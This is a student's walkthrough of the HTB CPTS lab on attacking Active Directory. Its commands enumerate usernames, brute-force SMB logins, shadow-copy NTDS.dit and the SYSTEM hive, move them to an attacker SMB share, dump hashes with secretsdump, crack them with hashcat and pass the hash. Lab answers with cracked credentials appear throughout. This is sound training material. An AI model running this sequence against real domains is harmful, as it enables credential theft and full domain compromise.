### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Attacking Active Directory and NTDS.dit <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking Active Directory and NTDS.dit



Domain-joined hosts route auth requests to a DC. `NTDS.dit` (`%systemroot%\ntds`) holds every domain user/computer/group + password hashes. Synced to all writable DCs.

#### Username conventions to enumerate

| Convention | Example for Jane Jill Doe |
|---|---|
| firstinitial+lastname | jdoe |
| f+m+lastname | jjdoe |
| firstname+lastname | janedoe |
| firstname.lastname | jane.doe |
| lastname.firstname | doe.jane |

Email format usually leaks the convention (`jdoe@inlanefreight.com`).

Generate name permutations with [Username Anarchy](https://github.com/urbanadventurer/username-anarchy):

```diff
+ $ ./username-anarchy -i names.txt
```

<br>

Validate usernames via Kerberos pre-auth with [Kerbrute](https://github.com/ropnop/kerbrute):

```diff
+ $ ./kerbrute_linux_amd64 userenum --dc <DC-IP> --domain <domain> names.txt
```

<br>

#### Brute-force AD logon with NetExec

```diff
+ $ netexec smb <DC-IP> -u <user> -p /usr/share/wordlists/fasttrack.txt
```

<br>

`(Pwn3d!)` = local admin / DA on the DC. Watch for account lockout policies (Group Policy).

#### Capture NTDS.dit

Connect via Evil-WinRM:

```diff
+ $ evil-winrm -i <DC-IP> -u <user> -p '<password>'
```

<br>

Verify privileges:

```diff
+ *Evil-WinRM* PS C:\> net localgroup
+ *Evil-WinRM* PS C:\> net user <user>
```

<br>

Need `Administrators` or `Domain Admins` to dump NTDS.

Create Volume Shadow Copy of C: (file is locked while AD is up):

```diff
+ *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

<br>

Copy NTDS + SYSTEM hive out of the snapshot:

```diff
+ *Evil-WinRM* PS C:\> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
+ *Evil-WinRM* PS C:\> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\system32\config\SYSTEM C:\NTDS\SYSTEM
```

<br>

Move both files to attack box via SMB share (impacket-smbserver from earlier section).

Extract hashes offline:

```diff
+ $ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

<br>

Faster alternative — NetExec one-shot (handles VSS + dump + parse):

```diff
+ $ netexec smb <DC-IP> -u <user> -p <pass> -M ntdsutil
```

<br>

Crack NT hashes:

```diff
+ $ sudo hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
```

<br>

#### Pass the Hash (PtH) when cracking fails — NTLM auth via hash:

```diff
+ $ evil-winrm -i <DC-IP> -u Administrator -H <NT-hash>
```

<br>

---

<br>

### Exercise

IP: 10.129.202.85

---

### Question 1:
What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: `****.***`)

&#x1F6A9; found **ntds.dit**.

---

### Question 2:
Submit the NT hash associated with the Administrator user from the example output in the section reading.

&#x1F6A9; found **64f12cddaa88057e--edit--06a81b54e73b949b**.

---

### Question 3:
On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

Generate username permutations:

```diff
+ $ git clone https://github.com/urbanadventurer/username-anarchy.git
+ $ ./username-anarchy -i /home/htb-ac-830862/Desktop/john_snow.txt
```

<br>

NetExec dictionary attack against SMB on the DC:

```diff
+ $ netexec smb 10.129.202.85 -u /home/htb-ac-830862/Desktop/john_snow.txt -p /usr/share/wordlists/fasttrack.txt | grep '+'
```

	SMB    10.129.202.85   445    ILF-DC01   [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

&#x1F6A9; found **jmarston:P@--edit--ssword!**.

---

### Question 4:
Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

NMAP shows port 5985 (WinRM) open. Pop a shell:

```diff
+ $ evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'
```

<br>

`net user jmarston` confirms Domain Admins membership. Make a working dir + shadow copy of C::

```diff
+ *Evil-WinRM* PS C:\> mkdir C:\not_sus
+ *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

<br>

Copy NTDS + SYSTEM out of the snapshot:

```diff
+ *Evil-WinRM* PS C:\> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\not_sus\NTDS.dit
+ *Evil-WinRM* PS C:\> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\SYSTEM C:\not_sus\SYSTEM
```

<br>

Stand up SMB share on attack box and exfil:

```diff
+ $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CRAPPDATA /home/htb-ac-830862/CRAPPDATA
+ *Evil-WinRM* PS C:\> move C:\not_sus \\10.10.14.24\CRAPPDATA
```

<br>

Dump hashes:

```diff
+ $ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

	ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::

<br>

Crack Jennifer's NT hash:

```diff
+ $ sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /mnt/SSD_DATA/SecLists/rockyou.txt -d 1,2
```

	92fd67fd2f49d0e83744aa82363f021b:Winter2008

&#x1F6A9; found **Wint--edit--er2008**.
